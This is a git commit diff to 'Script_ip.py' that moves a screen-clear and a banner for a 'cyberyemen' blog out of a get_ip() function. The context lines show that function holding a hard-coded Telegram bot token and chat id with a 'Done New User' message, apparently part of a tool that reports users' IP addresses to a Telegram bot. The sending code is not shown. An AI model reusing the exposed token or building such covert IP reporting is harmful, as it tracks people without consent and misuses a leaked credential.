7dac7fbc0dc7bf0495d9b544ab113cc601f45a28
〆M̂Ŕ. ʂÏLĘNԷ〆 <88721343+Mrsilent501@users.noreply.github.com>
2021-08-21 00:10:19 +0200

    Update Script_ip.py

--- Script_ip.py
+++ Script_ip.py
@@ -4,10 +4,10 @@ import sys
 from time import sleep
 import threading
 ###################################
+os.system("clear")
+print ("W\033[92mebsite\033[91m:- \033[94mcyberyemen.blogspot.com")
+sleep (1)
 def get_ip():
-	os.system("clear")
-	print ("W\033[92mebsite\033[91m:- \033[94mcyberyemen.blogspot.com")
-	sleep (1)
 	token = "1937421918:AAGD_3GxLJA7D-aPQuItkGqY-32UId2aUzE"
 	id1 = "1823390961"
 	f = "Done New User"
